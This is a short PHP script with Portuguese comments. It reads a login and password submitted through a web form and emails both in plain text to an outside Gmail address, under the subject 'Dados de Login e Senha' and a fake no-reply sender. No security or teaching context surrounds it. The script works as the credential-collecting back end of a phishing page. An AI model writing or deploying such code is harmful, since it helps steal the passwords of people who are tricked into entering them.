<?php
// Verifica se o método de requisição é POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Captura os dados enviados pelo formulário
    $login = $_POST['login'];
    $senha = $_POST['senha'];

    // Configura o destinatário do e-mail
    $to = 'lucascostaol429@Gmail.com'; // Substitua pelo seu e-mail

    // Configura o assunto do e-mail
    $subject = 'Dados de Login e Senha';

    // Monta a mensagem do e-mail
    $message = "Usuário: $login\nSenha: $senha";

    // Configura os cabeçalhos do e-mail
    $headers = 'From: no-reply@example.com' . "\r\n" .
               'Reply-To: no-reply@example.com' . "\r\n" .
               'X-Mailer: PHP/' . phpversion();

    // Envia o e-mail usando a função mail()
    if(mail($to, $subject, $message, $headers)) {
        echo "Dados enviados com sucesso!";
    } else {
        echo "Falha ao enviar os dados.";
    }
} else {
    echo "Método de requisição inválido.";
}
?>
